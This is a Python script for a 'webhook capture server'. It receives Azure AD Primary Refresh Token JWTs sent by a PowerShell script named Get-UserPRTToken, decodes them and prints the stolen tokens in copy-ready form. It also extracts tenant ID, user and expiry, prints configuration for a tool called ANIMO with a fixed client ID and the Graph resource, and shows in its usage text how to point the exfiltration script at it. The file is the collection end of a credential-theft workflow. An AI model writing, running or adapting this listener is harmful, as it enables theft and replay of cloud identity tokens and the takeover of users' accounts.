#!/usr/bin/env python3
"""
Webhook Capture Server
Captures and displays data sent by Get-UserPRTToken PowerShell script
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
from datetime import datetime
import argparse
import os
import base64


class WebhookHandler(BaseHTTPRequestHandler):
    """HTTP request handler that captures and displays webhook data"""

    # Class variable to store captured data
    captured_data = []

    def log_message(self, format, *args):
        """Override to customize logging format"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        sys.stderr.write(f"[{timestamp}] {format % args}\n")

    def do_POST(self):
        """Handle POST requests from the PowerShell script"""
        try:
            # Get content length
            content_length = int(self.headers.get('Content-Length', 0))

            # Read the request body
            body = self.rfile.read(content_length)

            # Get content type
            content_type = self.headers.get('Content-Type', 'unknown')

            # Decode body
            try:
                decoded_body = body.decode('utf-8')
            except UnicodeDecodeError:
                decoded_body = body.decode('latin-1')

            # Create capture entry
            capture_entry = {
                'timestamp': datetime.now().isoformat(),
                'path': self.path,
                'method': 'POST',
                'content_type': content_type,
                'content_length': content_length,
                'headers': dict(self.headers),
                'body': decoded_body,
                'raw_body': body.hex()
            }

            # Store captured data
            WebhookHandler.captured_data.append(capture_entry)

            # Print captured data
            print("\n" + "="*80)
            print(f"[+] WEBHOOK REQUEST CAPTURED - {datetime.now().strftime('%H:%M:%S')}")
            print("="*80)
            print(f"Path: {self.path}")
            print(f"Method: POST")
            print(f"Content-Type: {content_type}")
            print(f"Content-Length: {content_length}")
            print(f"\nHeaders:")
            for header, value in self.headers.items():
                print(f"  {header}: {value}")

            print(f"\n{'='*80}")
            print("BODY (Plain Text):")
            print("="*80)
            print(decoded_body)

            # Check if it looks like a JWT token
            if decoded_body.startswith('eyJ'):
                print(f"\n{'='*80}")
                print("[*] Detected JWT-like token (starts with 'eyJ')")
                print("="*80)

                # Display single-line version for easy copying
                single_line_token = decoded_body.replace('\n', '').replace('\r', '').strip()
                print(f"\n{'='*80}")
                print("[COPY-FRIENDLY FORMAT - Single Line]")
                print("="*80)
                print(single_line_token)
                print("="*80)

                # Try to decode JWT header and extract tenant info
                try:
                    parts = decoded_body.split('.')
                    if len(parts) >= 2:
                        # Decode header
                        header_data = parts[0]
                        # Add padding if needed
                        header_data += '=' * (4 - len(header_data) % 4)
                        decoded_header = base64.urlsafe_b64decode(header_data)

                        # Decode payload
                        payload_data = parts[1]
                        payload_data += '=' * (4 - len(payload_data) % 4)
                        decoded_payload = base64.urlsafe_b64decode(payload_data)

                        print("\n[JWT Header]")
                        try:
                            header_json = json.loads(decoded_header)
                            print(json.dumps(header_json, indent=2))
                        except:
                            print(decoded_header.decode('utf-8', errors='replace'))

                        print("\n[JWT Payload]")
                        try:
                            payload_json = json.loads(decoded_payload)
                            print(json.dumps(payload_json, indent=2))

                            # Extract tenant information for ANIMO
                            print(f"\n{'='*80}")
                            print("[TENANT INFORMATION FOR ANIMO]")
                            print("="*80)

                            tenant_id = payload_json.get('tid')
                            if tenant_id:
                                print(f"\n✓ Tenant ID: {tenant_id}")
                                print(f"  USE THIS IN ANIMO: {tenant_id}")

                            upn = payload_json.get('upn') or payload_json.get('unique_name') or payload_json.get('preferred_username')
                            if upn:
                                print(f"\n✓ User: {upn}")
                                if '@' in upn:
                                    domain = upn.split('@')[1]
                                    print(f"  Domain: {domain}")
                                    print(f"  Alternative tenant: {domain}")

                            # Check expiry
                            exp = payload_json.get('exp')
                            if exp:
                                exp_time = datetime.fromtimestamp(exp)
                                now = datetime.now()
                                if exp_time > now:
                                    remaining = exp_time - now
                                    print(f"\n✓ Token valid until: {exp_time}")
                                    print(f"  Time remaining: {remaining}")
                                else:
                                    print(f"\n✗ WARNING: TOKEN EXPIRED at {exp_time}")

                            if tenant_id or upn:
                                print(f"\n{'='*80}")
                                print("[ANIMO CONFIGURATION]")
                                print("="*80)
                                if tenant_id:
                                    print(f"\nTenant field: {tenant_id}")
                                elif upn and '@' in upn:
                                    print(f"\nTenant field: {upn.split('@')[1]}")
                                print("Client ID: 1fec8e78-bce4-4aaf-ab1b-5451cc387264")
                                print("Resource: https://graph.microsoft.com/")

                        except:
                            print(decoded_payload.decode('utf-8', errors='replace'))
                except Exception as e:
                    print(f"[!] Could not decode JWT: {e}")

            print(f"\n{'='*80}")
            print(f"[*] Raw body (hex): {body.hex()[:200]}{'...' if len(body.hex()) > 200 else ''}")
            print("="*80 + "\n")

            # Send 200 OK response
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK - Data captured successfully\n')

        except Exception as e:
            print(f"[!] Error processing request: {e}", file=sys.stderr)
            self.send_response(500)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f'Error: {str(e)}\n'.encode())

    def do_GET(self):
        """Handle GET requests - show status page"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()

        html = f"""
        <html>
        <head><title>Webhook Capture Server</title></head>
        <body>
        <h1>Webhook Capture Server</h1>
        <p>Server is running and listening for webhooks...</p>
        <p>Captured requests: {len(WebhookHandler.captured_data)}</p>
        <p>Send POST requests to this URL to capture data.</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode())


def save_captured_data(filename='captured_webhooks.json'):
    """Save all captured data to a JSON file"""
    if WebhookHandler.captured_data:
        with open(filename, 'w') as f:
            json.dump(WebhookHandler.captured_data, f, indent=2)
        print(f"\n[+] Captured data saved to: {filename}")
        return True
    return False


def main():
    parser = argparse.ArgumentParser(
        description='Webhook Capture Server - Captures data sent by PowerShell scripts',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start server on default port 8000
  python3 webhook_capture.py

  # Start server on custom port
  python3 webhook_capture.py -p 9000

  # Start server on specific interface
  python3 webhook_capture.py -i 192.168.1.61 -p 8000

  # Auto-save captured data
  python3 webhook_capture.py -o captured_prt.json

Then run the PowerShell script:
  PS> Get-UserPRTToken -WebhookUrl "http://127.0.0.1:8000/"
        """
    )

    parser.add_argument('-i', '--interface',
                        default='0.0.0.0',
                        help='Interface to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--port',
                        type=int,
                        default=8000,
                        help='Port to listen on (default: 8000)')
    parser.add_argument('-o', '--output',
                        help='Save captured data to file on exit')

    args = parser.parse_args()

    # Create server
    server_address = (args.interface, args.port)
    httpd = HTTPServer(server_address, WebhookHandler)

    print("="*80)
    print("Webhook Capture Server for Get-UserPRTToken PowerShell Script")
    print("="*80)
    print(f"[*] Server listening on: {args.interface}:{args.port}")
    print(f"[*] Webhook URL: http://{args.interface if args.interface != '0.0.0.0' else 'localhost'}:{args.port}/")
    print(f"[*] Press Ctrl+C to stop the server")

    if args.output:
        print(f"[*] Will save captured data to: {args.output}")

    print("="*80)
    print("\nWaiting for webhook requests...\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Server shutting down...")
        httpd.shutdown()

        # Save captured data if requested
        if args.output and WebhookHandler.captured_data:
            save_captured_data(args.output)

        print(f"[*] Total requests captured: {len(WebhookHandler.captured_data)}")
        print("[*] Server stopped.")


if __name__ == '__main__':
    main()
